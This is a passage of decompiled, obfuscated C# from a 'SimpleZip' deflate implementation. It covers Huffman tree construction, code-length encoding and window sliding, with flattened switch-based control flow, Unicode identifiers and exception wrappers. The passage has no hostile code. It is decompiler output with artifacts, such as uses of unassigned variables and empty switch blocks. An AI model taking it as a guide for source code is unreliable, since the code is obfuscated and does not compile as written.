                  case 15:
                    num1 = index1 < this.Ⴄ.Ⴅ ? 12 : 0;
                    continue;
                  default:
                    int length = this.Ⴅ.Length;
                    numArray1 = new int[this.Ⴄ.Ⴅ];
                    goto case 2;
                }
              }
            }
            catch (Exception ex)
            {
              int[] o1 = numArray1;
              // ISSUE: variable of a boxed type
              __Boxed<int> o2 = (ValueType) num2;
              // ISSUE: variable of a boxed type
              __Boxed<int> o3 = (ValueType) index1;
              // ISSUE: variable of a boxed type
              __Boxed<int> o4 = (ValueType) index2;
              // ISSUE: variable of a boxed type
              __Boxed<int> o5 = (ValueType) num3;
              int[] o6 = numArray3;
              // ISSUE: variable of a boxed type
              __Boxed<IntPtr> o7 = (ValueType) index3;
              StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this);
              throw;
            }
label_17:
            switch (4)
            {
            }
          }
          catch (Exception ex)
          {
            int num4;
            object[] objects = new object[11]
            {
              (object) numArray1,
              (object) num2,
              (object) index1,
              (object) index2,
              (object) num3,
              (object) numArray3,
              (object) index3,
              (object) numArray2,
              (object) num1,
              (object) num4,
              (object) this
            };
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
        }

        private void Ⴗ(int[] Ⴄ)
        {
          int num1;
          int length;
          int num2;
          int num3;
          int index1;
          int[] numArray1;
          int index2;
          int num4;
          int num5;
          int num6;
          int[] numArray2;
          IntPtr index3;
          int num7;
          int num8;
          int ⴅ;
          int num9;
          int index4;
          object[] objArray;
          try
          {
            try
            {
              num1 = 15;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    num6 = numArray1[index2];
                    (numArray2 = this.Ⴄ.Ⴍ)[(int) (index3 = (IntPtr) (num6 - 1))] = numArray2[index3] + 1;
                    num1 = 7;
                    continue;
                  case 1:
                    (numArray2 = this.Ⴄ.Ⴍ)[(int) (index3 = (IntPtr) num7)] = numArray2[index3] - 1;
                    num1 = 27;
                    continue;
                  case 2:
                    index4 = 2 * Ⴄ[num8++];
                    num1 = 24;
                    continue;
                  case 3:
                    num9 = this.Ⴄ.Ⴍ[ⴅ - 1];
                    goto case 34;
                  case 4:
                    --index2;
                    num1 = 11;
                    continue;
                  case 5:
                    num3 -= 1 << this.Ⴄ.Ⴅ - 1 - num7;
                    num1 = 10;
                    continue;
                  case 6:
                    num1 = index1 < this.Ⴄ.Ⴅ ? 33 : 22;
                    continue;
                  case 7:
                    this.Ⴓ[Ⴄ[2 * index2]] = (byte) numArray1[index2];
                    num1 = 4;
                    continue;
                  case 8:
                    num7 = this.Ⴄ.Ⴅ - 1;
                    num1 = 17;
                    continue;
                  case 9:
                  case 35:
                    goto label_40;
                  case 10:
                    num1 = num3 <= 0 ? 25 : 31;
                    continue;
                  case 11:
                    num1 = index2 >= 0 ? 19 : 14;
                    continue;
                  case 12:
                    length = Ⴄ.Length / 2;
                    num1 = 13;
                    continue;
                  case 13:
                    num2 = (length + 1) / 2;
                    num3 = 0;
                    index1 = 0;
                    num1 = 6;
                    continue;
                  case 14:
                    num1 = num3 != 0 ? 8 : 35;
                    continue;
                  case 16:
                    --ⴅ;
                    num1 = 23;
                    continue;
                  case 17:
                    num1 = this.Ⴄ.Ⴍ[--num7] == 0 ? 17 : 1;
                    continue;
                  case 18:
                    num8 = 2 * num2;
                    ⴅ = this.Ⴄ.Ⴅ;
                    num1 = 23;
                    continue;
                  case 19:
                    num1 = Ⴄ[2 * index2 + 1] == -1 ? 0 : 21;
                    continue;
                  case 20:
                    num1 = num9 > 0 ? 2 : 16;
                    continue;
                  case 21:
                    num4 = numArray1[index2] + 1;
                    num1 = num4 <= this.Ⴄ.Ⴅ ? 32 : 28;
                    continue;
                  case 22:
                    numArray1 = new int[length];
                    numArray1[length - 1] = 0;
                    index2 = length - 1;
                    num1 = 11;
                    continue;
                  case 23:
                    num1 = ⴅ != 0 ? 3 : 9;
                    continue;
                  case 24:
                    num1 = Ⴄ[index4 + 1] != -1 ? 20 : 26;
                    continue;
                  case 25:
                    num1 = num3 > 0 ? 17 : 36;
                    continue;
                  case 26:
                    this.Ⴓ[Ⴄ[index4]] = (byte) ⴅ;
                    --num9;
                    num1 = 20;
                    continue;
                  case 27:
                    int[] ⴍ;
                    numArray2 = ⴍ = this.Ⴄ.Ⴍ;
                    int index5;
                    num7 = index5 = num7 + 1;
                    index3 = (IntPtr) index5;
                    int num10 = numArray2[index3] + 1;
                    ⴍ[index5] = num10;
                    num1 = 5;
                    continue;
                  case 28:
                    num4 = this.Ⴄ.Ⴅ;
                    ++num3;
                    num1 = 32;
                    continue;
                  case 30:
                    (numArray2 = this.Ⴄ.Ⴍ)[(int) (index3 = (IntPtr) (this.Ⴄ.Ⴅ - 2))] = numArray2[index3] - num3;
                    num1 = 18;
                    continue;
                  case 31:
                    num1 = num7 < this.Ⴄ.Ⴅ - 1 ? 1 : 25;
                    continue;
                  case 32:
                    int[] numArray3 = numArray1;
                    int index6 = Ⴄ[2 * index2];
                    numArray1[Ⴄ[2 * index2 + 1]] = num5 = num4;
                    int num11 = num5;
                    numArray3[index6] = num11;
                    num1 = 4;
                    continue;
                  case 33:
                    this.Ⴄ.Ⴍ[index1] = 0;
                    goto case 37;
                  case 34:
                    num1 = 20;
                    continue;
                  case 36:
                    (numArray2 = this.Ⴄ.Ⴍ)[(int) (index3 = (IntPtr) (this.Ⴄ.Ⴅ - 1))] = numArray2[index3] + num3;
                    num1 = 30;
                    continue;
                  case 37:
                    ++index1;
                    num1 = 6;
                    continue;
                  default:
                    this.Ⴓ = new byte[this.Ⴅ.Length];
                    goto case 12;
                }
              }
            }
            catch (Exception ex)
            {
              objArray = new object[18]
              {
                (object) length,
                (object) num2,
                (object) num3,
                (object) index1,
                (object) numArray1,
                (object) index2,
                (object) num4,
                (object) num6,
                (object) num7,
                (object) num8,
                (object) ⴅ,
                (object) num9,
                (object) index4,
                (object) num5,
                (object) numArray2,
                (object) index3,
                (object) this,
                (object) Ⴄ
              };
              object[] objects = objArray;
              StackFrameHelper.CreateExceptionN(ex, objects);
              throw;
            }
label_40:
            switch (2)
            {
            }
          }
          catch (Exception ex)
          {
            int num12;
            object[] objects = new object[21]
            {
              (object) length,
              (object) num2,
              (object) num3,
              (object) index1,
              (object) numArray1,
              (object) index2,
              (object) num4,
              (object) num6,
              (object) num7,
              (object) num8,
              (object) ⴅ,
              (object) num9,
              (object) index4,
              (object) num5,
              (object) numArray2,
              (object) index3,
              (object) objArray,
              (object) num1,
              (object) num12,
              (object) this,
              (object) Ⴄ
            };
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
        }

        public void Ⴓ()
        {
          int num1;
          int length;
          int[] numArray1;
          int num2;
          int num3;
          int index1;
          int num4;
          int index2;
          int index3;
          int num5;
          int num6;
          int[] Ⴄ;
          int[] numArray2;
          int num7;
          int index4;
          int index5;
          int index6;
          int index7;
          int index8;
          int index9;
          int num8;
          int index10;
          int num9;
          object[] objArray;
          try
          {
            try
            {
              num1 = 23;
              while (true)
              {
                int num10;
                switch (num1)
                {
                  case 0:
                  case 27:
                    numArray1[index9] = index7;
                    num1 = num2 > 1 ? 35 : 20;
                    continue;
                  case 1:
                    index5 = numArray1[index4];
                    Ⴄ[2 * index4] = index5;
                    num1 = 26;
                    continue;
                  case 3:
                  case 22:
                    numArray1[index9] = numArray1[index8];
                    num1 = 8;
                    continue;
                  case 4:
                    num7 = num6;
                    index4 = 0;
                    num1 = 40;
                    continue;
                  case 5:
                    num4 = (int) this.Ⴅ[index1];
                    num1 = num4 == 0 ? 7 : 32;
                    continue;
                  case 6:
                    index8 = 0;
                    index9 = 1;
                    num1 = 15;
                    continue;
                  case 7:
                    ++index1;
                    num1 = 24;
                    continue;
                  case 8:
                    num1 = (index9 = index8) <= 0 ? 27 : 34;
                    continue;
                  case 9:
                    num1 = (index9 = index8) <= 0 ? 30 : 49;
                    continue;
                  case 10:
                    numArray1[index2] = index1;
                    num3 = index1;
                    num1 = 7;
                    continue;
                  case 11:
                    numArray1[index8] = numArray1[index9];
                    index8 = index9;
                    index9 = index8 * 2 + 1;
                    num1 = 15;
                    continue;
                  case 12:
                    num1 = 39;
                    continue;
                  case 13:
                    num1 = index9 + 1 >= num2 ? 11 : 44;
                    continue;
                  case 14:
                    numArray1[index8] = numArray1[index9];
                    index8 = index9;
                    index9 = index9 * 2 + 1;
                    num1 = 29;
                    continue;
                  case 15:
                    num1 = index9 < num2 ? 13 : 41;
                    continue;
                  case 16:
                    this.Ⴅ = Ⴈ.ႳႤ.Ⴈ(num3 + 1, this.Ⴈ, 980, 908);
                    num1 = 38;
                    continue;
                  case 17:
                    num9 = Ⴈ.Ⴗ.Ⴃ(numArray2[index6] & (int) byte.MaxValue, numArray2[index10] & (int) byte.MaxValue, 461, 440);
                    goto case 18;
                  case 18:
                    num1 = 48;
                    continue;
                  case 19:
                    num3 = 0;
                    index1 = 0;
                    num1 = 24;
                    continue;
                  case 20:
                    goto label_52;
                  case 21:
                    ++index9;
                    num1 = 14;
                    continue;
                  case 24:
                    num1 = index1 < length ? 5 : 12;
                    continue;
                  case 25:
                    num1 = numArray2[numArray1[index9]] <= numArray2[numArray1[index9 + 1]] ? 14 : 21;
                    continue;
                  case 26:
                    Ⴄ[2 * index4 + 1] = -1;
                    numArray2[index4] = (int) this.Ⴅ[index5] << 8;
                    num1 = 45;
                    continue;
                  case 28:
                    num1 = (int) this.Ⴅ[numArray1[index3 = (index2 - 1) / 2]] > num4 ? 42 : 10;
                    continue;
                  case 29:
                    num1 = index9 < num2 ? 43 : 46;
                    continue;
                  case 30:
                    numArray1[index9] = index7;
                    index10 = numArray1[0];
                    index7 = num7++;
                    num1 = 50;
                    continue;
                  case 31:
                    num1 = index2 <= 0 ? 10 : 28;
                    continue;
                  case 32:
                    index2 = num2++;
                    num1 = 31;
                    continue;
                  case 33:
                    num3 = num10 = num3 + 1;
                    break;
                  case 34:
                    num1 = numArray2[numArray1[index8 = (index9 - 1) / 2]] > num8 ? 3 : 27;
                    continue;
                  case 35:
                    index6 = numArray1[0];
                    index7 = numArray1[--num2];
                    num1 = 52;
                    continue;
                  case 36:
                    num10 = 0;
                    break;
                  case 37:
                    numArray1[index9] = numArray1[index8];
                    num1 = 9;
                    continue;
                  case 38:
                    num6 = num2;
                    Ⴄ = new int[4 * num2 - 2];
                    numArray2 = new int[2 * num2 - 1];
                    num1 = 4;
                    continue;
                  case 39:
                    num1 = num2 < 2 ? 47 : 16;
                    continue;
                  case 40:
                    num1 = index4 < num2 ? 1 : 35;
                    continue;
                  case 41:
                    num1 = 8;
                    continue;
                  case 42:
                    numArray1[index2] = numArray1[index3];
                    index2 = index3;
                    num1 = 31;
                    continue;
                  case 43:
                    num1 = index9 + 1 >= num2 ? 14 : 25;
                    continue;
                  case 44:
                    num1 = numArray2[numArray1[index9]] <= numArray2[numArray1[index9 + 1]] ? 11 : 51;
                    continue;
                  case 45:
                    numArray1[index4] = index4;
                    ++index4;
                    num1 = 40;
                    continue;
                  case 46:
                    num8 = numArray2[index7];
                    num1 = 9;
                    continue;
                  case 47:
                    num1 = num3 < 2 ? 33 : 36;
                    continue;
                  case 48:
                    numArray2[index7] = num8 = numArray2[index6] + numArray2[index10] - num9 + 1;
                    num1 = 6;
                    continue;
                  case 49:
                    num1 = numArray2[numArray1[index8 = (index9 - 1) / 2]] > num8 ? 37 : 30;
                    continue;
                  case 50:
                    Ⴄ[2 * index7] = index6;
                    Ⴄ[2 * index7 + 1] = index10;
                    num1 = 17;
                    continue;
                  case 51:
                    ++index9;
                    num1 = 11;
                    continue;
                  case 52:
                    index8 = 0;
                    index9 = 1;
                    num1 = 29;
                    continue;
                  default:
                    length = this.Ⴅ.Length;
                    numArray1 = new int[length];
                    num2 = 0;
                    num1 = 19;
                    continue;
                }
                num5 = num10;
                numArray1[num2++] = num5;
                num1 = 39;
              }
label_52:
              this.Ⴗ(Ⴄ);
            }
            catch (Exception ex)
            {
              objArray = new object[23]
              {
                (object) length,
                (object) numArray1,
                (object) num2,
                (object) num3,
                (object) index1,
                (object) num4,
                (object) index2,
                (object) index3,
                (object) num5,
                (object) num6,
                (object) Ⴄ,
                (object) numArray2,
                (object) num7,
                (object) index4,
                (object) index5,
                (object) index6,
                (object) index7,
                (object) index8,
                (object) index9,
                (object) num8,
                (object) index10,
                (object) num9,
                (object) this
              };
              object[] objects = objArray;
              StackFrameHelper.CreateExceptionN(ex, objects);
              throw;
            }
            switch (1)
            {
            }
          }
          catch (Exception ex)
          {
            int num11;
            object[] objects = new object[26]
            {
              (object) length,
              (object) numArray1,
              (object) num2,
              (object) num3,
              (object) index1,
              (object) num4,
              (object) index2,
              (object) index3,
              (object) num5,
              (object) num6,
              (object) Ⴄ,
              (object) numArray2,
              (object) num7,
              (object) index4,
              (object) index5,
              (object) index6,
              (object) index7,
              (object) index8,
              (object) index9,
              (object) num8,
              (object) index10,
              (object) num9,
              (object) objArray,
              (object) num1,
              (object) num11,
              (object) this
            };
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
        }

        public int Ⴈ()
        {
          int num1;
          int num2;
          int index;
          int num3;
          try
          {
            try
            {
              num1 = 3;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    num2 += (int) this.Ⴅ[index] * (int) this.Ⴓ[index];
                    num1 = 1;
                    continue;
                  case 1:
                    ++index;
                    num1 = 7;
                    continue;
                  case 2:
                  case 4:
                  case 7:
                    num1 = index < this.Ⴅ.Length ? 0 : 8;
                    continue;
                  case 5:
                  case 8:
                    goto label_6;
                  default:
                    num2 = 0;
                    index = 0;
                    num1 = 7;
                    continue;
                }
              }
label_6:
              num3 = num2;
            }
            catch (Exception ex)
            {
              // ISSUE: variable of a boxed type
              __Boxed<int> o1 = (ValueType) num2;
              // ISSUE: variable of a boxed type
              __Boxed<int> o2 = (ValueType) index;
              StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
              throw;
            }
            switch (2)
            {
              default:
                return num3;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num1;
            int num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) num4;
            StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this);
            throw;
          }
        }

        public void Ⴐ(SimpleZip.ႤႠ.ႤႥ Ⴐ)
        {
          int num1;
          int num2;
          int index1;
          int num3;
          int num4;
          int num5;
          int num6;
          short[] ⴅ;
          IntPtr index2;
          try
          {
            try
            {
              num1 = 18;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    num3 = 0;
                    num1 = 8;
                    continue;
                  case 1:
                    num5 = 138;
                    num6 = 3;
                    num1 = 8;
                    continue;
                  case 2:
                    (ⴅ = Ⴐ.Ⴅ)[18] = (short) ((int) ⴅ[18] + 1);
                    num1 = 12;
                    continue;
                  case 3:
                    (ⴅ = Ⴐ.Ⴅ)[16] = (short) ((int) ⴅ[16] + 1);
                    num1 = 12;
                    continue;
                  case 4:
                  case 9:
                  case 16:
                    num5 = 6;
                    num6 = 3;
                    num1 = num2 == num4 ? 8 : 14;
                    continue;
                  case 5:
                    (ⴅ = Ⴐ.Ⴅ)[(int) (index2 = (IntPtr) num2)] = (short) ((int) ⴅ[index2] + (int) (short) num3);
                    num1 = 12;
                    continue;
                  case 6:
                    num1 = num2 == 0 ? 19 : 3;
                    continue;
                  case 7:
                    (ⴅ = Ⴐ.Ⴅ)[17] = (short) ((int) ⴅ[17] + 1);
                    num1 = 12;
                    continue;
                  case 8:
                    num2 = num4;
                    ++index1;
                    num1 = 17;
                    continue;
                  case 10:
                    num1 = num2 == (int) this.Ⴓ[index1] ? 21 : 20;
                    continue;
                  case 11:
                  case 20:
                    num1 = num3 >= num6 ? 6 : 5;
                    continue;
                  case 12:
                    num1 = index1 < this.Ⴅ ? 22 : 13;
                    continue;
                  case 13:
                    goto label_22;
                  case 14:
                    (ⴅ = Ⴐ.Ⴅ)[(int) (index2 = (IntPtr) num4)] = (short) ((int) ⴅ[index2] + 1);
                    num1 = 0;
                    continue;
                  case 17:
                    num1 = index1 >= this.Ⴅ ? 20 : 10;
                    continue;
                  case 19:
                    num1 = num3 > 10 ? 2 : 7;
                    continue;
                  case 21:
                    ++index1;
                    num1 = ++num3 >= num5 ? 20 : 17;
                    continue;
                  case 22:
                    num3 = 1;
                    num4 = (int) this.Ⴓ[index1];
                    num1 = num4 != 0 ? 4 : 1;
                    continue;
                  default:
                    num2 = -1;
                    index1 = 0;
                    num1 = 12;
                    continue;
                }
              }
            }
            catch (Exception ex)
            {
              // ISSUE: variable of a boxed type
              __Boxed<int> o1 = (ValueType) num5;
              // ISSUE: variable of a boxed type
              __Boxed<int> o2 = (ValueType) num6;
              // ISSUE: variable of a boxed type
              __Boxed<int> o3 = (ValueType) num3;
              // ISSUE: variable of a boxed type
              __Boxed<int> o4 = (ValueType) num2;
              // ISSUE: variable of a boxed type
              __Boxed<int> o5 = (ValueType) index1;
              // ISSUE: variable of a boxed type
              __Boxed<int> o6 = (ValueType) num4;
              short[] o7 = ⴅ;
              // ISSUE: variable of a boxed type
              __Boxed<IntPtr> o8 = (ValueType) index2;
              SimpleZip.ႤႠ.ႤႥ o10 = Ⴐ;
              StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) this, (object) o10);
              throw;
            }
label_22:
            switch (3)
            {
            }
          }
          catch (Exception ex)
          {
            int num7;
            object[] objects = new object[12]
            {
              (object) num5,
              (object) num6,
              (object) num3,
              (object) num2,
              (object) index1,
              (object) num4,
              (object) ⴅ,
              (object) index2,
              (object) num1,
              (object) num7,
              (object) this,
              (object) Ⴐ
            };
            StackFrameHelper.CreateExceptionN(ex, objects);
            throw;
          }
        }

        public void Ⴈ(SimpleZip.ႤႠ.ႤႥ Ⴈ)
        {
          int num1;
          int Ⴐ1;
          int index;
          int num2;
          int Ⴐ2;
          int num3;
          int num4;
          try
          {
            try
            {
              num1 = 19;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    Ⴐ1 = Ⴐ2;
                    ++index;
                    num1 = 14;
                    continue;
                  case 1:
                    num1 = 5;
                    continue;
                  case 2:
                    num1 = 23;
                    continue;
                  case 3:
                  case 13:
                    num1 = num2 > 10 ? 16 : 18;
                    continue;
                  case 4:
                    num3 = 138;
                    num4 = 3;
                    num1 = 0;
                    continue;
                  case 5:
                    num1 = index < this.Ⴅ ? 12 : 10;
                    continue;
                  case 6:
                    num3 = 6;
                    num4 = 3;
                    num1 = Ⴐ1 == Ⴐ2 ? 0 : 17;
                    continue;
                  case 7:
                    Ⴈ.Ⴅ(16);
                    this.Ⴃ.Ⴈ.Ⴅ(num2 - 3, 2);
                    goto case 1;
                  case 8:
                    num1 = Ⴐ1 == (int) this.Ⴓ[index] ? 11 : 9;
                    continue;
                  case 9:
                    num1 = num2 >= num4 ? 21 : 2;
                    continue;
                  case 10:
                    goto label_25;
                  case 11:
                    ++index;
                    num1 = ++num2 >= num3 ? 9 : 14;
                    continue;
                  case 12:
                    num2 = 1;
                    Ⴐ2 = (int) this.Ⴓ[index];
                    num1 = Ⴐ2 != 0 ? 6 : 4;
                    continue;
                  case 14:
                    num1 = index >= this.Ⴅ ? 9 : 8;
                    continue;
                  case 15:
                    Ⴈ.Ⴅ(Ⴐ1);
                    goto case 23;
                  case 16:
                    Ⴈ.Ⴅ(18);
                    this.Ⴃ.Ⴈ.Ⴅ(num2 - 11, 7);
                    goto case 5;
                  case 17:
                    Ⴈ.Ⴅ(Ⴐ2);
                    num2 = 0;
                    num1 = 0;
                    continue;
                  case 18:
                    Ⴈ.Ⴅ(17);
                    this.Ⴃ.Ⴈ.Ⴅ(num2 - 3, 3);
                    num1 = 5;
                    continue;
                  case 20:
                    num1 = 5;
                    continue;
                  case 21:
                    num1 = Ⴐ1 == 0 ? 13 : 7;
                    continue;
                  case 22:
                    num1 = 5;
                    continue;
                  case 23:
                    num1 = num2-- > 0 ? 15 : 20;
                    continue;
                  default:
                    Ⴐ1 = -1;
                    index = 0;
                    goto case 22;
                }
              }
label_25:;
            }
            catch (Exception ex)
            {
              // ISSUE: variable of a boxed type
              __Boxed<int> o1 = (ValueType) num3;
              // ISSUE: variable of a boxed type
              __Boxed<int> o2 = (ValueType) num4;
              // ISSUE: variable of a boxed type
              __Boxed<int> o3 = (ValueType) num2;
              // ISSUE: variable of a boxed type
              __Boxed<int> o4 = (ValueType) Ⴐ1;
              // ISSUE: variable of a boxed type
              __Boxed<int> o5 = (ValueType) index;
              // ISSUE: variable of a boxed type
              __Boxed<int> o6 = (ValueType) Ⴐ2;
              SimpleZip.ႤႠ.ႤႥ o8 = Ⴈ;
              StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
              throw;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴐ1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴐ2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o7 = (ValueType) num1;
            SimpleZip.ႤႠ.ႤႥ o9 = Ⴈ;
            StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) this, (object) o9);
            throw;
          }
        }

        static ႤႥ()
        {
          try
          {
            SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException0(ex);
            throw;
          }
        }
      }
    }

    internal sealed class ႤႨ
    {
      private SimpleZip.ႤႼ Ⴅ;
      private SimpleZip.ႤႠ Ⴗ;
      private SimpleZip.ႤႷ.Ⴐ Ⴜ;

      public ႤႨ(SimpleZip.ႤႼ Ⴓ)
      {
        byte[] numArray1;
        short[] numArray2;
        short[] numArray3;
        int num1;
        int num2;
        int num3;
        try
        {
          try
          {
            this.Ⴅ = Ⴓ;
            this.Ⴗ = new SimpleZip.ႤႠ(Ⴓ);
            numArray1 = new byte[65536];
            this.Ⴜ.Ⴜ = numArray1;
            numArray2 = new short[32768];
            this.Ⴜ.Ⴐ = numArray2;
            numArray3 = new short[32768];
            this.Ⴜ.Ⴈ = numArray3;
            num2 = num1 = 1;
            this.Ⴜ.Ⴃ = num2;
            num3 = num1;
            this.Ⴜ.Ⴀ = num3;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num1;
            SimpleZip.ႤႼ o3 = Ⴓ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          byte[] o2 = numArray1;
          short[] o3 = numArray2;
          short[] o4 = numArray3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num3;
          SimpleZip.ႤႼ o8 = Ⴓ;
          StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
          throw;
        }
      }

      private void Ⴓ()
      {
        int num;
        try
        {
          try
          {
            num = (int) this.Ⴜ.Ⴜ[this.Ⴜ.Ⴃ] << 5 ^ (int) this.Ⴜ.Ⴜ[this.Ⴜ.Ⴃ + 1];
            this.Ⴜ.Ⴗ = num;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      private int Ⴃ()
      {
        int num1;
        int index;
        short num2;
        int num3;
        int num4;
        try
        {
          try
          {
            num1 = 4;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_7;
                case 1:
                  this.Ⴜ.Ⴐ[index] = (short) this.Ⴜ.Ⴃ;
                  num1 = 3;
                  continue;
                case 3:
                case 5:
                  goto label_5;
                case 6:
                  this.Ⴜ.Ⴈ[this.Ⴜ.Ⴃ & (int) short.MaxValue] = num2 = this.Ⴜ.Ⴐ[index];
                  num1 = 1;
                  continue;
                default:
                  index = (this.Ⴜ.Ⴗ << 5 ^ (int) this.Ⴜ.Ⴜ[this.Ⴜ.Ⴃ + 2]) & (int) short.MaxValue;
                  num1 = 6;
                  continue;
              }
            }
label_5:
            num3 = index;
            this.Ⴜ.Ⴗ = num3;
            num4 = (int) num2 & (int) ushort.MaxValue;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<short> o1 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) index;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
            throw;
          }
label_7:
          switch (1)
          {
            default:
              return num4;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<short> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num1;
          int num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num5;
          StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this);
          throw;
        }
      }

      private void Ⴄ()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int index1;
        int num5;
        int index2;
        int num6;
        try
        {
          try
          {
            num1 = 6;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  SimpleZip.ႤႨ ⴄⴈ1 = this;
                  num3 = ⴄⴈ1.Ⴜ.Ⴃ - 32768;
                  ⴄⴈ1.Ⴜ.Ⴃ = num3;
                  num1 = 5;
                  continue;
                case 1:
                  num1 = index1 < 32768 ? 3 : 9;
                  continue;
                case 2:
                case 12:
                  num6 = (int) this.Ⴜ.Ⴈ[index2] & (int) ushort.MaxValue;
                  this.Ⴜ.Ⴈ[index2] = num6 >= 32768 ? (short) (num6 - 32768) : (short) 0;
                  ++index2;
                  num1 = 11;
                  continue;
                case 3:
                case 10:
                  num5 = (int) this.Ⴜ.Ⴐ[index1] & (int) ushort.MaxValue;
                  this.Ⴜ.Ⴐ[index1] = num5 >= 32768 ? (short) (num5 - 32768) : (short) 0;
                  ++index1;
                  num1 = 1;
                  continue;
                case 5:
                  SimpleZip.ႤႨ ⴄⴈ2 = this;
                  num4 = ⴄⴈ2.Ⴜ.Ⴀ - 32768;
                  ⴄⴈ2.Ⴜ.Ⴀ = num4;
                  num1 = 8;
                  continue;
                case 7:
                case 9:
                  index2 = 0;
                  num1 = 11;
                  continue;
                case 8:
                  index1 = 0;
                  num1 = 1;
                  continue;
                case 11:
                  num1 = index2 < 32768 ? 12 : 14;
                  continue;
                case 13:
                  SimpleZip.ႤႨ ⴄⴈ3 = this;
                  num2 = ⴄⴈ3.Ⴜ.Ⴍ - 32768;
                  ⴄⴈ3.Ⴜ.Ⴍ = num2;
                  num1 = 0;
                  continue;
                case 14:
                  goto label_14;
                default:
                  AppPathFinder.Ⴍ((Array) this.Ⴜ.Ⴜ, 32768, (Array) this.Ⴜ.Ⴜ, 0, 32768, 811, 817);
                  num1 = 13;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) index2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num6;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
            throw;
          }
label_14:
          switch (0)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) index2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) num1;
          int num7;
          // ISSUE: variable of a boxed type
          __Boxed<int> o9 = (ValueType) num7;
          StackFrameHelper.CreateException10(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9, (object) this);
          throw;
        }
      }

      public void Ⴈ()
      {
        int num1;
